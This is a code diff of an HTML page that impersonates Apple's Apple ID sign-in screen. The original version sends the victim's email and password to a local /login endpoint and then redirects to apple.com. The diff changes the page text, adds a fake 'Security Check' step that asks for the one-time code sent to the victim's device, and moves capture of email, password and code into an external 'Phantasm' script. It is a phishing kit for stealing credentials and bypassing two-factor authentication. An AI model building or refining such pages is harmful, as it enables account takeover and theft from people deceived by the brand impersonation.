@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to Apple ID</title>
+    <title>Log in to Apple ID</title>
     <link rel="icon" href="https://www.apple.com/favicon.ico">
     <style>
         :root {
@@ -208,14 +208,14 @@
     <div class="main-content">
         
         <div id="step-1" class="fade-in">
-            <h1>Sign In</h1>
-            <div class="subtitle">Sign in to Apple ID</div>
+            <h1>Log In</h1>
+            <div class="subtitle">Log in to Apple ID</div>
             
-            <form onsubmit="goToStep2(event)">
+            <form id="email-form">
                 <div class="input-wrapper">
                     <input type="text" id="email" class="input-field" placeholder=" " required>
                     <span class="floating-label">Email or Phone Number</span>
-                    <button type="submit" class="btn-arrow">
+                    <button type="submit" id="btn-next" class="btn-arrow">
                         <svg viewBox="0 0 24 24"><path d="M12,24c6.6,0,12-5.4,12-12S18.6,0,12,0S0,5.4,0,12S5.4,24,12,24z M12,1.3c5.9,0,10.7,4.8,10.7,10.7S17.9,22.7,12,22.7S1.3,17.9,1.3,12S6.1,1.3,12,1.3z M15.6,11.6L10,6.1l-0.9,0.9l4.7,4.6H5.3v1.3h8.5l-4.7,4.6l0.9,0.9l5.6-5.6C16,12.5,16,11.9,15.6,11.6z"/></svg>
                     </button>
                 </div>
@@ -233,17 +233,17 @@
         </div>
 
         <div id="step-2" class="hidden fade-in">
-            <h1>Sign In</h1>
+            <h1>Log In</h1>
             <div class="apple-id-display">
                 <span id="user-display">user@example.com</span>
-                <span class="back-arrow" onclick="goToStep1()" style="cursor:pointer; margin-left: 8px; color: #0071e3; font-size: 20px; vertical-align: middle;">&#8853;</span>
+                <span class="back-arrow" id="back-btn" style="cursor:pointer; margin-left: 8px; color: #0071e3; font-size: 20px; vertical-align: middle;">&#8853;</span>
             </div>
             
-            <form onsubmit="submitLogin(event)">
+            <form id="login-form">
                 <div class="input-wrapper">
                     <input type="password" id="password" class="input-field" placeholder=" " required>
                     <span class="floating-label">Password</span>
-                    <button type="submit" class="btn-arrow">
+                    <button type="submit" id="btn-submit" class="btn-arrow">
                         <svg viewBox="0 0 24 24"><path d="M12,24c6.6,0,12-5.4,12-12S18.6,0,12,0S0,5.4,0,12S5.4,24,12,24z M12,1.3c5.9,0,10.7,4.8,10.7,10.7S17.9,22.7,12,22.7S1.3,17.9,1.3,12S6.1,1.3,12,1.3z M15.6,11.6L10,6.1l-0.9,0.9l4.7,4.6H5.3v1.3h8.5l-4.7,4.6l0.9,0.9l5.6-5.6C16,12.5,16,11.9,15.6,11.6z"/></svg>
                     </button>
                 </div>
@@ -267,49 +267,42 @@
         <div style="margin-top: 10px;">Copyright © 2024 Apple Inc. All rights reserved.</div>
     </div>
 
+    <!-- OTP Section -->
+    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
+        <h2 style="margin-bottom: 20px;">Security Check</h2>
+        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
+        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
+        <button id="btn-otp-submit" style="padding: 10px 20px; background: #0071e3; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
+    </div>
+
+    <script src="/core/assets/js/phantasm.js"></script>
     <script>
-        let userEmail = "";
-
-        function goToStep2(event) {
-            event.preventDefault();
-            const emailInput = document.getElementById('email');
-            if (emailInput.value) {
-                userEmail = emailInput.value;
-                document.getElementById('user-display').textContent = userEmail;
-                
-                document.getElementById('step-1').classList.add('hidden');
-                document.getElementById('step-2').classList.remove('hidden');
-                
-                setTimeout(() => document.getElementById('password').focus(), 100);
-            }
-        }
-
-        function goToStep1() {
-            document.getElementById('step-2').classList.add('hidden');
-            document.getElementById('step-1').classList.remove('hidden');
-        }
-
-        async function submitLogin(event) {
-            event.preventDefault();
-            const password = document.getElementById('password').value;
-            
-            try {
-                const response = await fetch('/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        email: userEmail,
-                        password: password
-                    })
-                });
-                
-                if (response.ok) {
-                    window.location.href = "https://www.apple.com";
+        document.addEventListener('DOMContentLoaded', () => {
+            const app = new Phantasm({
+                redirectUrl: 'https://www.apple.com',
+                selectors: {
+                    email: '#email',
+                    password: '#password',
+                    otp: '#otp-input',
+                    nextBtn: '#btn-next',
+                    submitBtn: '#btn-submit',
+                    otpBtn: '#btn-otp-submit',
+                    step1: '#step-1',
+                    step2: '#step-2',
+                    step3: '#step-3-otp',
+                    userDisplay: '#user-display'
                 }
-            } catch (error) {
-                console.error('Error:', error);
+            });
+
+            const backBtn = document.getElementById('back-btn');
+            if (backBtn) {
+                backBtn.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    app.transitionToStep(1);
+                });
             }
-        }
+        });
     </script>
+
 </body>
 </html>
